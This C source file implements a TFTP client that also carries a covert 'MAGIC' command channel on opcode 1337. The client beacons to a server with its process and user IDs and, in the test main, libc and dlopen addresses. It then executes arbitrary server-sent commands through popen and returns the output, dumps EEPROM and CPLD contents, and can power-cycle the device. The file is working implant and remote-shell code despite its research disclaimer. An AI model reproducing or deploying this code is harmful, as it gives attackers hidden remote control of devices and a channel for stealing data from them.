/*
 * Copyright (C) 2025 ff794e44ea1c2b5211a3b07c57b5a3813f87f53ac10d78e56b16b79db6ff9615
 *                    b726ae7cf45cc4dfa8de359caffb893209bca614d9387a7666b106052fba3e50
 *
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <https://www.gnu.org/licenses/>.
 *
 * DMCA Security Research Exemption:
 * Good faith security research performed consistent with 17 U.S.C. §1201(j) and
 * 37 CFR §201.40(b)(7) is explicitly permitted.
 *
 * This software is intended solely for educational, forensic, and lawful
 * security research purposes. Any use of this software for offensive or harmful
 * purposes is strictly prohibited.
 *
 * GENERAL DISCLAIMER:
 * This program is distributed WITHOUT ANY WARRANTY or guarantee of suitability.
 * The author explicitly disclaims responsibility and liability for any direct,
 * indirect, incidental, or consequential damages resulting from use or misuse.
 * Users accept all risks associated with use or distribution.
 *
 * Use, modification, or distribution constitutes explicit agreement to all terms
 * above.
 */
/* taoftp.c - TAO's Hypothetical TFTP client - Making TFTP Great Again! */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include "murmurhash.h"
#include "tftp.h"
#include "debug.h"
#include "devices.h"
#include <pthread.h>
#include "common.h"

static int is_enough_for_op(int op, ssize_t rcvd) {
    switch (op) {
        case MAGIC_HEARTBEAT_EXEC:
            return (rcvd > sizeof(struct magic_op_exec));
        case MAGIC_HEARTBEAT_DUMP:
            return (rcvd > sizeof(struct magic_op_dump));
        case MAGIC_HEARTBEAT_POWERCYCLE:
        case MAGIC_HEARTBEAT_NOOP:
            return (rcvd > 1);
        default:
            return 0;
    }
}

static inline void put_uint32(uint8_t *buffer, size_t pos, uint32_t value)
{
    uint32_t net_val = htonl(value);

    buffer[pos]     = (net_val >> 24) & 0xff;
    buffer[pos + 1] = (net_val >> 16) & 0xff;
    buffer[pos + 2] = (net_val >> 8)  & 0xff;
    buffer[pos + 3] = net_val & 0xff;
}

static int tftp_magic(int sockfd, struct sockaddr_in *server_addr)
{
    char ackbuf[4096];
    char buffer[4096];
    struct sockaddr_in recv_addr;
    socklen_t addrlen;
    ssize_t n;
    struct timeval tv;
    unsigned int pos;
    unsigned char sec_opcode;
    unsigned short recv_opcode;
    int err = TFTP_MAGIC_OK;

    /* timeout settings, must be within the other side's ACK window */
    tv.tv_sec = TAOFTP_ACK_TIMEOUT_SECS;
    tv.tv_usec = 0;

    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv)) < 0) {
        debug_perror("setsockopt");
    }

    while (1)
    {
        pos = 0;

        /* Wait for a MAGIC packet */
        addrlen = sizeof(recv_addr);
        n = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                     (struct sockaddr *)&recv_addr, &addrlen);
        if (n < 0)
        {
            if (errno == EAGAIN || errno == EWOULDBLOCK)
            {
                debug_fprintf(stderr, "Timeout waiting for MAGIC packet; terminating session.\n");

                pos = 0;
                ackbuf[pos++] = (char)MAGIC_ACK;
                ackbuf[pos++] = (char)MAGIC_HEARTBEAT_EXIT;

                if (sendto(sockfd, ackbuf, pos, 0,
                        (struct sockaddr *)server_addr, sizeof(*server_addr))
                    != pos) {
                    debug_perror("sendto");
                }

                memset(ackbuf, 0, sizeof(ackbuf));
                memset(buffer, 0, sizeof(buffer));

                err = TFTP_MAGIC_EXIT;
                break;
            }

            debug_perror("recvfrom");
            break;
        }

        if (n < 3) {
            debug_fprintf(stderr, "Received packet too short\n");
            continue;
        }

        /* update server_addr port based on received packet */
        server_addr->sin_port = recv_addr.sin_port;
        recv_opcode = (((unsigned char)buffer[0]) << 8) | ((unsigned char)buffer[1]);

        if (recv_opcode != 1337) {
            debug_fprintf(stderr, "Unexpected opcode: %d\n", recv_opcode);
            continue;
        }

        sec_opcode = (unsigned char)buffer[3];
        debug_fprintf(stderr, "Received MAGIC packet (recv'd %zd bytes) op %d (0x%x)\n",
                n, sec_opcode, sec_opcode);

        /* check for heartbeat exit command */
        if (sec_opcode == MAGIC_HEARTBEAT_EXIT)
        {
            debug_fprintf(stderr, "HEARTBEAT_EXIT received, terminating MAGIC processing.\n");
            pos = 0;
            ackbuf[pos++] = (char)MAGIC_ACK;
            ackbuf[pos++] = (char)MAGIC_HEARTBEAT_EXIT;

            if (sendto(sockfd, ackbuf, pos, 0,
                    (struct sockaddr *)server_addr, sizeof(*server_addr))
                != pos) {
                debug_perror("sendto");
            }

            memset(ackbuf, 0, sizeof(ackbuf));
            memset(buffer, 0, sizeof(buffer));

            err = TFTP_MAGIC_EXIT;
            break;
        }

        if (!is_enough_for_op(sec_opcode, n)) {
            debug_fprintf(stderr, "Insufficient data for MAGIC opcode %d\n", sec_opcode);
            continue;
        }

        if (sec_opcode == MAGIC_HEARTBEAT_EXEC)
        {
            size_t total_bytes_read = 0;
            const char fail[] = { 'F', 'A', 'I', 'L', 0x00 };
            struct magic_op_exec *exec_op = (struct magic_op_exec *)(buffer + 4);
            char command[513];

            memcpy(command, exec_op->cmd, 512);
            command[512] = '\0';

            debug_fprintf(stderr, "MAGIC_HEARTBEAT_EXEC: %s\n", command);

            FILE *fp = popen(command, "r");
            if (fp == NULL)
            {
                struct magic_op_exec_ack *ack = (struct magic_op_exec_ack *)&ackbuf;

                ack->hdr.opcode = (char)MAGIC_ACK;
                ack->hdr.sec_opcode = (char) sec_opcode;
                ack->seq = 0;
                ack->end = 2;

                pos = sizeof(struct magic_op_exec_ack);
                strncpy(ackbuf + pos, fail, sizeof(ackbuf) - pos);
                pos += sizeof(fail);
                ackbuf[pos - 1] = '\0';

                put_uint32((unsigned char *) ackbuf, pos, (uint32_t) errno);
                pos += sizeof(uint32_t);

                if (sendto(sockfd, ackbuf, pos, 0,
                        (struct sockaddr *)server_addr, sizeof(*server_addr))
                    != pos) {
                    debug_perror("sendto");
                }

                memset(ackbuf, 0, pos);

                continue;
            }

            const size_t max_ack_size = sizeof(ackbuf) - sizeof(struct magic_op_exec_ack);
            size_t bytes_xfer;
            int seq = 0;

            while ((bytes_xfer = fread(ackbuf + sizeof(struct magic_op_exec_ack),
                1, max_ack_size, fp)) > 0)
            {
                struct magic_op_exec_ack *ack = (struct magic_op_exec_ack *) &ackbuf;
                ack->hdr.opcode = (char) MAGIC_ACK;
                ack->hdr.sec_opcode = (char) sec_opcode;
                ack->seq = (unsigned char) seq;
                ack->end = (bytes_xfer < max_ack_size) ? 1 : 0;

                size_t total_len = sizeof(struct magic_op_exec_ack) + bytes_xfer;

                if (sendto(sockfd, ackbuf, total_len, 0,
                        (struct sockaddr *)server_addr, sizeof(*server_addr))
                    != total_len) {
                    debug_perror("sendto");
                    memset(ackbuf, 0, total_len);
                    break;
                }

                total_bytes_read += bytes_xfer;
                seq++;
            }

            int status = pclose(fp);

            if (total_bytes_read == 0 && status != 0)
            {
                struct magic_op_exec_ack *ack = (struct magic_op_exec_ack *)&ackbuf;

                ack->hdr.opcode = (char)MAGIC_ACK;
                ack->hdr.sec_opcode = (char) sec_opcode;
                ack->seq = 0;
                ack->end = 3;

                pos = sizeof(struct magic_op_exec_ack);
                strncpy(ackbuf + pos, fail, sizeof(ackbuf) - pos);
                pos += sizeof(fail);
                ackbuf[pos - 1] = '\0';

                put_uint32((unsigned char *) ackbuf, pos, (uint32_t) status);
                pos += sizeof(uint32_t);

                put_uint32((unsigned char *) ackbuf, pos, (uint32_t) errno);
                pos += sizeof(uint32_t);

                debug_fprintf(stderr, "MAGIC_HEARTBEAT_EXEC: popen/pclose failure %d, errno %d.\n",
                    status, errno);

                if (sendto(sockfd, ackbuf, pos, 0,
                        (struct sockaddr *)server_addr, sizeof(*server_addr))
                    != pos) {
                    debug_perror("sendto");
                }

                memset(ackbuf, 0, pos);

                continue;
            }
        }
        else if (sec_opcode == MAGIC_HEARTBEAT_DUMP)
        {
            struct magic_op_dump_ack *ack = (struct magic_op_dump_ack *)&ackbuf;
            struct magic_op_dump *dump_op = (struct magic_op_dump *)(buffer + 4);

            const device_model_config_t *devcfg = select_model_config(PUBLIC_RELEASE_PLATFORM);

            debug_fprintf(stderr, "MAGIC_HEARTBEAT_DUMP: device %d\n", dump_op->device);


            ack->hdr.opcode = (char)MAGIC_ACK;
            ack->hdr.sec_opcode = (char) sec_opcode;
            ack->device = dump_op->device;

            pos = sizeof(struct magic_op_dump_ack);

            switch (dump_op->device)
            {
                /* system CPLD */
                case 1:
                    /* ackbuf must have at least MAX_CPLD_REGISTER left */
                    ack->result = syscpld_read(devcfg, ((unsigned char *) ackbuf) + pos,
                        MAX_CPLD_REGISTER);
                    if (!ack->result)
                        pos += MAX_CPLD_REGISTER;
                    break;
                /* EEPROM */
                case 0:
                default:
                    ack->result = eeprom_read(devcfg, 0, ((unsigned char *) ackbuf) + pos, 254);
                    if (!ack->result)
                        pos += 254;
                    break;
            }

            ack->result = htonl(ack->result);

            if (sendto(sockfd, ackbuf, pos, 0,
                    (struct sockaddr *)server_addr, sizeof(*server_addr))
                != pos) {
                debug_perror("sendto");
            }

            memset(ackbuf, 0, pos);
            continue;
        }
        else if (sec_opcode == MAGIC_HEARTBEAT_POWERCYCLE)
        {
            struct magic_op_ack_header *ack = (struct magic_op_ack_header *)&ackbuf;
            const device_model_config_t *devcfg = select_model_config(PUBLIC_RELEASE_PLATFORM);

            debug_fprintf(stderr, "MAGIC_HEARTBEAT_POWERCYCLE: powercycling!\n");

            ack->opcode = (char)MAGIC_ACK;
            ack->sec_opcode = (char) sec_opcode;
            pos = sizeof(struct magic_op_ack_header);

            if (sendto(sockfd, ackbuf, pos, 0,
                    (struct sockaddr *)server_addr, sizeof(*server_addr))
                != pos) {
                debug_perror("sendto");
            }

            /* goodbye horses */
            device_powercycle(devcfg);

            memset(ackbuf, 0, pos);
            continue;
        }
        else
        {
            struct magic_op_ack_header *ack = (struct magic_op_ack_header *) &ackbuf;

            ack->opcode = (char)MAGIC_ACK;
            ack->sec_opcode = (char)sec_opcode;
            pos += sizeof(struct magic_op_ack_header);
            ackbuf[pos++] = 0xff;

            debug_fprintf(stderr, "sending MAGIC_ACK: op %x (%d), sec op %x (%d)\n",
                ack->opcode, ack->opcode, ack->sec_opcode, ack->sec_opcode);

            if (sendto(sockfd, ackbuf, pos, 0,
                       (struct sockaddr *)server_addr, sizeof(*server_addr))
                != pos) {
                debug_perror("sendto");
                memset(ackbuf, 0, sizeof(struct magic_op_ack_header));
                continue;
            }

            memset(ackbuf, 0, sizeof(struct magic_op_ack_header));
            continue;
        }
    }

    return err;
}

/*---------------------------------------------------------------------------
 * Function: tftp_send_request
 *
 * Description:
 *   Build and send a TFTP RRQ or WRQ request packet.
 *
 * Parameters:
 *   sockfd      - The UDP socket descriptor.
 *   server_addr - Pointer to the server address structure.
 *   opcode      - The operation code (OP_RRQ or OP_WRQ).
 *   opbuf       - For OP_RRQ|OP_WRQ a filename, otherwise a data buffer.
 *
 * Returns:
 *   0 on success, -1 on error.
 *--------------------------------------------------------------------------*/
static int tftp_send_request(int sockfd, struct sockaddr_in *server_addr,
    int opcode, char *opbuf, size_t buflen)
{
    unsigned char buffer[516];
    unsigned int pos;
    unsigned short op;
    int sent_len;

    pos = 0;
    op = (unsigned short)opcode;

    /* Build the packet: 2 bytes opcode, filename, 0, mode ("octet"), 0 */
    buffer[pos++] = 0;
    buffer[pos++] = (char)op;

    /* opbuf is the filename for OP_RRQ|OP_WRQ */
    if (opcode == OP_RRQ || opcode == OP_WRQ) {
        strcpy((char *) &buffer[pos], opbuf);
        pos += (int)strlen(opbuf) + 1;

        strcpy((char *) &buffer[pos], MODE);
        pos += (int)strlen(MODE) + 1;
    } else {
        /* MAGIC request */
        buffer[pos++] = (char) 37;

        /* pack in the current process id, parent's pid and our uid */
        put_uint32(buffer, pos, (uint32_t)getpid());
        pos += sizeof(uint32_t);

        put_uint32(buffer, pos, (uint32_t)getppid());
        pos += sizeof(uint32_t);

        put_uint32(buffer, pos, (uint32_t)getuid());
        pos += sizeof(uint32_t);

        put_uint32(buffer, pos, (uint32_t)geteuid());
        pos += sizeof(uint32_t);

        /* pack any additional data if provided and optional secondary opcode */
        if (buflen < sizeof(buffer) - pos) {
            buffer[pos++] = (char) 1;
            memcpy(&buffer[pos], opbuf, buflen);
            pos += buflen;
        }
    }

    sent_len = sendto(sockfd, buffer, pos, 0,
                      (struct sockaddr *)server_addr, sizeof(*server_addr));
    if (sent_len != pos) {
        debug_perror("sendto request");
        return -1;
    }
    return 0;
}

/*---------------------------------------------------------------------------
 * Function: tftp_receive_file
 *
 * Description:
 *   Handles a TFTP read (RRQ) operation. Receives data packets from the
 *   server and writes them to a local file.
 *
 * Parameters:
 *   sockfd      - The UDP socket descriptor.
 *   server_addr - Pointer to the server address structure.
 *   filename    - The name of the file to save locally.
 *
 * Returns:
 *   0 on success, -1 on error.
 *--------------------------------------------------------------------------*/
static int tftp_receive_file(int sockfd, struct sockaddr_in *server_addr,
    const char *filename)
{
    FILE *fp;
    unsigned short expected_block;
    int finished;
    char buffer[516];
    struct sockaddr_in recv_addr;
    socklen_t addrlen;
    int n;
    unsigned short recv_opcode;
    unsigned short block;

    fp = fopen(filename, "wb");
    if (fp == NULL) {
        debug_perror("fopen for writing");
        return -1;
    }

    expected_block = 1;
    finished = 0;
    while (!finished) {
        addrlen = sizeof(recv_addr);
        n = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                     (struct sockaddr *)&recv_addr, &addrlen);
        if (n < 4) {
            debug_fprintf(stderr, "Received packet too short\n");
            fclose(fp);
            return -1;
        }
        /* Update server port to the one used by the server for the transfer */
        server_addr->sin_port = recv_addr.sin_port;
        recv_opcode = ((unsigned char)buffer[0] << 8) | ((unsigned char)buffer[1]);
        if (recv_opcode == OP_DATA) {
            block = ((unsigned char)buffer[2] << 8) | ((unsigned char)buffer[3]);
            if (block != expected_block) {
                debug_fprintf(stderr, "Unexpected block number: %d, expected: %d\n",
                        block, expected_block);
                fclose(fp);
                return -1;
            }
            if (fwrite(&buffer[4], 1, n - 4, fp) != (size_t)(n - 4)) {
                debug_perror("fwrite");
                fclose(fp);
                return -1;
            }
            {
                /* Send ACK packet */
                char ack[4];
                ack[0] = 0;
                ack[1] = OP_ACK;
                ack[2] = buffer[2]; /* block high byte */
                ack[3] = buffer[3]; /* block low byte */
                if (sendto(sockfd, ack, 4, 0,
                           (struct sockaddr *)server_addr,
                           sizeof(*server_addr)) != 4) {
                    debug_perror("sendto ack");
                    fclose(fp);
                    return -1;
                }
            }
            if ((n - 4) < BLOCK_SIZE) {
                finished = 1;
            }
            expected_block++;
        } else if (recv_opcode == OP_ERROR) {
            debug_fprintf(stderr, "[!] TaoFTP: Error from server: %s\n", &buffer[4]);
            fclose(fp);
            return -1;
        } else {
            debug_fprintf(stderr, "[!] TaoFTP: Unexpected opcode: %d\n", recv_opcode);
            fclose(fp);
            return -1;
        }
    }
    fclose(fp);
    return 0;
}

/*---------------------------------------------------------------------------
 * Function: tftp_upload_file
 *
 * Description:
 *   Handles a TFTP write (WRQ) operation. Uploads a local file to the
 *   server using DATA packets and waiting for corresponding ACKs.
 *
 * Parameters:
 *   sockfd      - The UDP socket descriptor.
 *   server_addr - Pointer to the server address structure.
 *   filename    - The name of the file to be uploaded.
 *
 * Returns:
 *   0 on success, -1 on error.
 *--------------------------------------------------------------------------*/
static int tftp_upload_file(int sockfd, struct sockaddr_in *server_addr,
    const char *filename)
{
    FILE *fp;
    unsigned short block_number;
    int bytes_read;
    char buffer[516];
    struct sockaddr_in recv_addr;
    socklen_t addrlen;
    int n;
    unsigned short recv_opcode;
    unsigned short ack_block;

    fp = fopen(filename, "rb");
    if (fp == NULL) {
        debug_perror("fopen for reading");
        return -1;
    }

    /* Wait for ACK packet for the WRQ (should have block number 0) */
    addrlen = sizeof(recv_addr);
    n = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                 (struct sockaddr *)&recv_addr, &addrlen);
    if (n < 4) {
        debug_fprintf(stderr, "[!] TaoFTP: Received packet too short\n");
        fclose(fp);
        return -1;
    }
    server_addr->sin_port = recv_addr.sin_port;
    recv_opcode = ((unsigned char)buffer[0] << 8) | ((unsigned char)buffer[1]);
    if (recv_opcode == OP_ACK) {
        ack_block = ((unsigned char)buffer[2] << 8) | ((unsigned char)buffer[3]);
        if (ack_block != 0) {
            debug_fprintf(stderr, "[!] TaoFTP: Expected ACK for WRQ with block 0, got block %d\n",
                    ack_block);
            fclose(fp);
            return -1;
        }
    } else if (recv_opcode == OP_ERROR) {
        debug_fprintf(stderr, "[!] TaoFTP: Error from server: %s\n", &buffer[4]);
        fclose(fp);
        return -1;
    } else {
        debug_fprintf(stderr, "[!] TaoFTP: Unexpected opcode: %d\n", recv_opcode);
        fclose(fp);
        return -1;
    }

    block_number = 1;
    for (;;) {
        bytes_read = (int)fread(&buffer[4], 1, BLOCK_SIZE, fp);
        /* Build DATA packet header */
        buffer[0] = 0;
        buffer[1] = OP_DATA;
        buffer[2] = (char)((block_number >> 8) & 0xff);
        buffer[3] = (char)(block_number & 0xff);
        if (sendto(sockfd, buffer, bytes_read + 4, 0,
                   (struct sockaddr *)server_addr, sizeof(*server_addr))
            != bytes_read + 4) {
            debug_perror("sendto data");
            fclose(fp);
            return -1;
        }
        addrlen = sizeof(recv_addr);
        n = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                     (struct sockaddr *)&recv_addr, &addrlen);
        if (n < 4) {
            debug_fprintf(stderr, "[!] TaoFTP: Received packet too short\n");
            fclose(fp);
            return -1;
        }
        recv_opcode = ((unsigned char)buffer[0] << 8) | ((unsigned char)buffer[1]);
        if (recv_opcode == OP_ACK) {
            ack_block = ((unsigned char)buffer[2] << 8) | ((unsigned char)buffer[3]);
            if (ack_block != block_number) {
                debug_fprintf(stderr, "[!] TaoFTP: Unexpected ACK block: %d, expected: %d\n",
                        ack_block, block_number);
                fclose(fp);
                return -1;
            }
        } else if (recv_opcode == OP_ERROR) {
            debug_fprintf(stderr, "[!] TaoFTP: Error from server: %s\n", &buffer[4]);
            fclose(fp);
            return -1;
        } else {
            debug_fprintf(stderr, "[!] TaoFTP: Unexpected opcode: %d\n", recv_opcode);
            fclose(fp);
            return -1;
        }
        block_number++;
        if (bytes_read < BLOCK_SIZE) {
            break;  /* Last block */
        }
    }
    fclose(fp);
    return 0;
}


/*
 * tftp_client_thread - Thread function that attempts a TFTP client operation.
 *   It reattempts the operation with exponential backoff if errors occur.
 *
 * Parameter (arg): pointer to a tftp_client_params_t structure.
 *
 * Returns: NULL when finished.
 */
static void *tftp_client_thread(void *arg)
{
    tftp_client_params_t *params = (tftp_client_params_t *) arg;
    int attempt = 0;
    int delay = params->initial_delay;
    int ret = -1;

    debug_fprintf(stderr, "[*] TaoFTP: connecting to %s\n", inet_ntoa(params->server_ip));

    while (params->max_attempts == 0 || attempt < params->max_attempts) {
        attempt++;
        debug_fprintf(stderr, "[*] TFTP attempt %d\n", attempt);

        int sockfd;
        struct sockaddr_in server_addr;
        sockfd = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfd < 0) {
            debug_perror("socket");
            continue;
        }

        memset(&server_addr, 0, sizeof(server_addr));

        memcpy(&server_addr.sin_addr, &(params->server_ip), sizeof(struct in_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(TFTP_PORT);

        if (params->op == TFTP_READ) {
            ret = tftp_send_request(sockfd, &server_addr, OP_RRQ, params->filename, 0);
            if (ret == 0) {
                ret = tftp_receive_file(sockfd, &server_addr, params->filename);
            }
        }
        else if (params->op == TFTP_WRITE) {
            ret = tftp_send_request(sockfd, &server_addr, OP_WRQ, params->filename, 0);
            if (ret == 0) {
                ret = tftp_upload_file(sockfd, &server_addr, params->filename);
            }
        }
        else if (params->op == TFTP_HEARTBEAT) {
            ret = tftp_send_request(sockfd, &server_addr, OP_MAGIC, NULL, 0);
            if (ret == 0) {
                debug_fprintf(stderr, "[+] TaoFTP: sending HEARTBEAT to %s\n",
                    inet_ntoa(params->server_ip));
                ret = tftp_magic(sockfd, &server_addr);
            }
        }

        close(sockfd);

        if (ret == 0) {
            debug_fprintf(stderr, "[+] TaoFTP: operation succeeded on attempt %d\n", attempt);
            break;
        } else {
            /* may want to handle exits different with a different exponential backoff/delay */
            debug_fprintf(stderr, "[*] TaoFTP: op failed on attempt %d; reattempting in %d seconds\n",
                attempt, delay);
            sleep(delay);
            delay *= 2;
            if (delay > params->max_delay) {
                delay = params->max_delay;
            }
        }
    }

    fflush(stdout);
    fflush(stderr);

    memset(params, 0, sizeof(tftp_client_params_t));
    free(params);

    debug_fprintf(stderr, "[!] exiting TaoFTP thread...\n");
    pthread_exit(NULL);
}

int tftp_launch(struct in_addr *addr, int op, const char *filename, int initial_delay,
    int max_retries, int do_join)
{
    pthread_t tid;
    tftp_client_params_t *params = malloc(sizeof(tftp_client_params_t));

    memset(params, 0, sizeof(tftp_client_params_t));
    memcpy(&(params->server_ip), addr, sizeof(struct in_addr));

    if (filename != NULL) {
        strncpy(params->filename, filename, sizeof(params->filename) - 1);
        params->filename[sizeof(params->filename) - 1] = '\0';
    }

    params->op = op;
    params->initial_delay = initial_delay;
    params->max_delay = params->initial_delay * 16;
    params->max_attempts = max_retries;

    debug_fprintf(stderr, "starting TFTP thread...\n");

    if (pthread_create(&tid, NULL, tftp_client_thread, params) != 0) {
        debug_perror("pthread_create");
        free(params);
        return -1;
    }

    if (do_join)
        pthread_join(tid, NULL);

    debug_fprintf(stderr, "done attftp_launch\n");

    return 0;
}

#ifdef TEST_MAIN
int main(int argc, char *argv[])
{
    int sockfd;
    struct sockaddr_in server_addr;
    int ret;
    char *server_ip;
    char *operation;
    char *filename;
    int is_read, is_write, is_heartbeat;

    is_read = 0;
    is_write = 0;

    if (argc != 4) {
        debug_fprintf(stderr, "Usage: %s <server_ip> <read|write|heartbeat> <filename>\n", argv[0]);
        exit(1);
    }

    server_ip = argv[1];
    operation = argv[2];
    filename = argv[3];

    if (strcmp(operation, "read") == 0) {
        is_read = 1;
    } else if (strcmp(operation, "write") == 0) {
        is_write = 1;
    } else if (strcmp(operation, "heartbeat") == 0) {
        is_heartbeat = 1;
    } else {
        debug_fprintf(stderr, "Invalid operation. Use read|write|heartbeat.\n");
        exit(1);
    }

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        debug_perror("socket");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TFTP_PORT);

    if (inet_aton(server_ip, &server_addr.sin_addr) == 0) {
        debug_fprintf(stderr, "Invalid IP address\n");
        close(sockfd);
        exit(1);
    }

    if (is_read) {
        if (tftp_send_request(sockfd, &server_addr, OP_RRQ, filename, 0) != 0) {
            close(sockfd);
            exit(1);
        }
        ret = tftp_receive_file(sockfd, &server_addr, filename);
        if (ret == 0) {
            printf("File received successfully.\n");
        }
    } else if (is_write) {
        if (tftp_send_request(sockfd, &server_addr, OP_WRQ, filename, 0) != 0) {
            close(sockfd);
            exit(1);
        }
        ret = tftp_upload_file(sockfd, &server_addr, filename);
        if (ret == 0) {
            printf("File uploaded successfully.\n");
        }
    } else if (is_heartbeat) {
        unsigned long libc_base  = find_library_base("libc.so");
        void *addr_mmap  = get_symbol_address("mmap");
        void *addr_dlopen = get_symbol_address("dlopen");

        uint32_t base_addrs_pack[4];

        base_addrs_pack[0] = htonl((uint32_t) libc_base);
        base_addrs_pack[1] = htonl((uint32_t) addr_mmap);
        base_addrs_pack[2] = htonl((uint32_t) addr_dlopen);

        if (tftp_send_request(sockfd, &server_addr, OP_MAGIC,
            (char *) &base_addrs_pack, sizeof(base_addrs_pack)) != 0) {
            close(sockfd);
            exit(1);
        }

        ret = tftp_magic(sockfd, &server_addr);
        if (ret == 0) {
            printf("done\n");
        }
    }

    close(sockfd);
    return 0;
}
#endif  /* TEST_MAIN */
